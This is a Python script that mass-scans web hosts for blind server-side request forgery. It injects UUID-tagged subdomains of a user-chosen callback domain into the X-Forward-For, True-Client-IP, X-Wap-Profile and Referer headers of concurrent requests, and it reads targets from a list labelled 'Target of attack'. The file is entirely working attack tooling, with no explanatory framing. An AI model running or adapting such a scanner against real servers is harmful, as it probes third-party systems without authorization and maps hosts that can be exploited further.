import sys
import uuid
import asyncio
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor


def test_url(session, host, referer):
    # build the headers with uuid for tracking
    test_id = uuid.uuid4().hex
    forwardedfor = test_id + '.forwardfor.' + referer
    trueclientip = test_id + '.trueclient.' + referer
    wapprofile = 'http://' + test_id + '.wap.' + referer + '/wamp.xml'
    referer = 'http://' + test_id + '.referer.' + referer
    headers = {'x-forward-for' : forwardedfor,
               'true-client-ip' : trueclientip,
               'x-wap-profile' : wapprofile,
               'referer' : referer}
    
    print('[+] Testing {}, {}'.format(host, test_id))

    # send the request, check the status
    url = 'http://' + host
    response = session.get(url, headers=headers)
    data = response.text
    if response.status_code != 200:
        print("[!] Error: {}, status {}".format(host, response.status_code))
    return data


async def run_ansync():
    if args.list:
        with open(args.list, 'r') as f:
            target_list = [t.strip() for t in f.readlines()]
    else:
        target_list = [args.target]

    print('[+] Loaded targets: {}'.format(len(target_list)))

    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        with requests.Session() as session:
            loop = asyncio.get_event_loop()
            tasks = [
                loop.run_in_executor(
                    executor,
                    test_url,
                    *(session, target, args.referer)
                )
                for target in target_list
            ]
            for response in await asyncio.gather(*tasks):
                pass


def main():
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(run_ansync())
    loop.run_until_complete(future)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: referee.py [target/list] [referer] (workers)')
        exit(0)

    parser = argparse.ArgumentParser(description="HTTP Header Tester idk")
    parser.add_argument('-t', '--target', help='Target of attack')
    parser.add_argument('-l', '--list', help='Specify list of targets')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Max number of concurrent workers (default 10)')
    parser.add_argument('-r', '--referer', help='url of referrer (ex: pwned.com)')
    args = parser.parse_args()

    main()
